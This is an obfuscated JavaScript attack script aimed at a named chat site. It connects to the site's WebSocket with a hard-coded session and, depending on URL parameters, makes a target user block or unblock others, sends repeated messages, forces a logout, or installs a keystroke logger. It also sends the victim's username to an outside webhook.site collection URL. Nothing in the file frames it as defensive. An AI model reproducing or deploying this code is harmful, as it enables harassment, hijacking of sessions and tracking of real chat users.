var _0x17ac=['success','mazhai','all','setInterval','nothing','status','guest','error','floor','random','blocks','send','stringify','unblock-user','onliners','username','ws--','dsmq9q4okl9nq4nva1rtu2rkbi','state:','OPEN','black','text','sam\x20londonn','href','http://chatroom.tamil2friends.com/login.php','onload','innerHTML','<img\x20src=\x22','src','\x22\x20/>','onkeydown','key','onopen','setTimeout','closed','log','start\x20exploit...','location','search','get','att','msg','Dragon','wss://chatroom.tamil2friends.com/chat','parse','data','register'];(function(_0xaa3915,_0x186331){var _0x4c7ad1=function(_0x2be678){while(--_0x2be678){_0xaa3915['push'](_0xaa3915['shift']());}};_0x4c7ad1(++_0x186331);}(_0x17ac,0x13d));var _0x2ff2=function(_0x28b282,_0x243a91){_0x28b282=_0x28b282-0x0;var _0x4e5982=_0x17ac[_0x28b282];return _0x4e5982;};console[_0x2ff2('0x0')](_0x2ff2('0x1'));const urlParams=new URLSearchParams(window[_0x2ff2('0x2')][_0x2ff2('0x3')]);const target_user=urlParams[_0x2ff2('0x4')]('id');const ROOM=urlParams['get']('rm');const attack_type=urlParams[_0x2ff2('0x4')](_0x2ff2('0x5'));const MSG=urlParams[_0x2ff2('0x4')](_0x2ff2('0x6'))['replace'](/-/g,'\x20');const repeat_time=parseInt(urlParams[_0x2ff2('0x4')]('rt'));const conn_time=parseInt(urlParams[_0x2ff2('0x4')]('ct'));var blockall=![];var unblockall=![];var guest=![];var allok=![];var guestname=_0x2ff2('0x7');var user='';var role='';var timer='';ws=new WebSocket(_0x2ff2('0x8'));ws['onmessage']=function(_0x50918f){var _0x5b1fac=JSON[_0x2ff2('0x9')](_0x50918f[_0x2ff2('0xa')]);var _0x468cb7=_0x5b1fac['type'];console['log']('message----',_0x5b1fac[_0x2ff2('0xa')]);if(_0x468cb7==_0x2ff2('0xb')){user=_0x5b1fac[_0x2ff2('0xa')]['username'];role=_0x5b1fac[_0x2ff2('0xa')]['role'];if(_0x5b1fac[_0x2ff2('0xa')]['status']==_0x2ff2('0xc')){if(user!=_0x2ff2('0xd')&&(user['indexOf'](target_user)>-0x1||target_user==_0x2ff2('0xe'))){getip();timer=window[_0x2ff2('0xf')](function(){if(attack_type=='sb'){self_blocker();}else if(attack_type=='sub'){self_unblocker();}else if(attack_type=='bl'){blocker();}else if(attack_type=='sm'){send(ROOM,MSG);}else if(attack_type=='lo'){loghimout();}else if(attack_type=='kl'){keylog();}else{console['log'](_0x2ff2('0x10'));}},repeat_time);}}if(_0x5b1fac['data'][_0x2ff2('0x11')]==_0x2ff2('0x12')){guest=!![];register(guestname);}if(_0x5b1fac[_0x2ff2('0xa')]['type']==_0x2ff2('0x13')){guestname=guestname+Math[_0x2ff2('0x14')](Math[_0x2ff2('0x15')]()*0xa+0x1);register(guestname);}}if(_0x468cb7==_0x2ff2('0x16')){if(_0x5b1fac[_0x2ff2('0xa')][_0x2ff2('0x16')]){if(unblockall){_0x5b1fac[_0x2ff2('0xa')]['blocks']['forEach'](_0x5116fd=>ws[_0x2ff2('0x17')](JSON[_0x2ff2('0x18')]({'type':_0x2ff2('0x19'),'data':{'username':_0x2ff2('0xd')}})));unblockall=![];}}}if(_0x468cb7==_0x2ff2('0x1a')){if(_0x5b1fac['data'][_0x2ff2('0x1a')]){if(blockall){_0x5b1fac[_0x2ff2('0xa')][_0x2ff2('0x1a')]['forEach'](_0x4b0429=>ws[_0x2ff2('0x17')](JSON['stringify']({'type':'block-user','data':{'username':_0x4b0429[_0x2ff2('0x1b')]}})));blockall=![];}}}};console['log'](_0x2ff2('0x1c'),ws);initsession=()=>{ws[_0x2ff2('0x17')](JSON['stringify']({'type':'init','data':{'session':_0x2ff2('0x1d')}}));};register=_0x2d435c=>{if(guest){ws[_0x2ff2('0x17')](JSON['stringify']({'type':'register','data':{'username':_0x2d435c,'gender':'male'}}));}};send=(_0x116721,_0x567ece)=>{console[_0x2ff2('0x0')](_0x2ff2('0x1e'),attack_type,user,role);if(ws[_0x2ff2('0x1f')]){ws[_0x2ff2('0x17')](JSON[_0x2ff2('0x18')]({'type':_0x2ff2('0x17'),'data':{'color':_0x2ff2('0x20'),'room':_0x116721,'gifinput':'','_gifhidden':'','yinput':'','msg':_0x567ece,'type':_0x2ff2('0x21')}}));ws['send'](JSON[_0x2ff2('0x18')]({'type':'unblock-user','data':{'username':_0x2ff2('0xd')}}));}};getblocklist=()=>{if(ws['OPEN']){ws['send'](JSON[_0x2ff2('0x18')]({'type':_0x2ff2('0x16'),'data':['a']}));}};blocker=()=>{console[_0x2ff2('0x0')]('state:',attack_type,user,role);if(ws['OPEN']){ws['send'](JSON[_0x2ff2('0x18')]({'type':'block-user','data':{'username':_0x2ff2('0x22')}}));}};fetch_room=_0x252d8c=>{if(ws['OPEN']){ws[_0x2ff2('0x17')](JSON['stringify']({'type':'fetch','data':{'room':_0x252d8c}}));}};self_blocker=()=>{console[_0x2ff2('0x0')]('state:',attack_type,user,role);blockall=!![];fetch_room(ROOM);};self_unblocker=()=>{console[_0x2ff2('0x0')]('state:',attack_type,user,role);unblockall=!![];getblocklist();};loghimout=()=>{console[_0x2ff2('0x0')](_0x2ff2('0x1e'),attack_type,user,role);window['top'][_0x2ff2('0x2')]['href']='http://chatroom.tamil2friends.com/login.php';parent[_0x2ff2('0x2')][_0x2ff2('0x23')]=_0x2ff2('0x24');};getip=()=>{console[_0x2ff2('0x0')]('state:',attack_type,user,role);var _0x13d8b8=new Image();_0x13d8b8['src']='https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c='+user;var _0x542b01=document['getElementById']('x');_0x13d8b8[_0x2ff2('0x25')]=function(){_0x542b01[_0x2ff2('0x26')]+=_0x2ff2('0x27')+_0x13d8b8[_0x2ff2('0x28')]+_0x2ff2('0x29');};};keylog=()=>{console['log'](_0x2ff2('0x1e'),attack_type,user,role);window[_0x2ff2('0x2a')]=function(_0x2e245e){console[_0x2ff2('0x0')](_0x2ff2('0x2b'),_0x2e245e[_0x2ff2('0x2b')]);};};ws[_0x2ff2('0x2c')]=()=>{initsession();register(guestname);window[_0x2ff2('0x2d')](function(){register(guestname);},0x3e8);window[_0x2ff2('0x2d')](function(){ws['close']();console[_0x2ff2('0x0')](_0x2ff2('0x2e'));window['clearInterval'](timer);},conn_time);};